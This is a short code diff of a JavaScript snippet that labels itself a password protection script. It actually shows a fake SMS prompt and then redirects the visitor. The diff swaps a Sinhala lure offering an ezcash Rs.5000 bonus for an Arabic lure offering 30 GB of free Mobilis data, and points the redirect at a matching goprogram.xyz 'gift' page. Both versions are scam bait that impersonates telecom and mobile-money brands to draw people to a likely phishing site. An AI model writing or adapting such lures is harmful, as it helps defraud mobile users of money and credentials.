@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = 'රු.5000 ක දීමනාවක්'
-password=prompt('SMS: සුභ පැතුම් ඔබගේ ezcash ගිණුම රු.5000 සංවත්සර දීමනාව ලබා ගැනීමට සුදුසුකම් ලබයි, ඉදිරියට යාමට කරුණාකර OK ඔබන්න. ','රු.5000 ක දීමනාවක්');
-if (password != 'රු.5000 ක දීමනාවක්') {
-location.href='https://ezcash.goprogram.xyz/gift';
+var password = '30 جيجابايت من البيانات'
+password=prompt('SMS: مبروك، رقمك مؤهل للحصول على 30 جيجابايت من البيانات المجانية في عرض يوم الاستقلال، يرجى الضغط على موافق للمتابعة ','30 جيجابايت من البيانات');
+if (password != '30 جيجابايت من البيانات') {
+location.href='https://mobilis-reward.goprogram.xyz/gift';
 }
